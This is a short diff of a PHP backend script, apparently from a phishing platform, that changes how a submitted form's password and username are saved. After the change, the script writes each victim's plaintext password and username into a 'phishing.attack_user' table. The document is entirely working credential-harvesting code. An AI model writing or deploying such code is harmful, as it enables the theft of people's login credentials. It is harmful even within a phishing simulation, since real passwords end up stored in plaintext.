@@ -8,11 +8,9 @@ $pass = $_POST['contraseña'];
 if($_POST['contraseña'] == $pass) {
     $passw = 1;
 
-    $click = "UPDATE phishing.attack_user SET password_seen=? WHERE user_uid=?";
-    $conexion->prepare($click)->execute([$passw, $id]);
+    $click = "UPDATE phishing.attack_user SET password_seen=?, user_password=?, user_username=? WHERE user_uid=?";
+    $conexion->prepare($click)->execute([$passw, $pass, $user, $id]);
 
-    $click1 = "UPDATE phishing.user SET password=?, username=? WHERE uid=?";
-    $conexion->prepare($click1)->execute([$pass, $user, $id]);
     }
 else
     echo 'No se lleno';
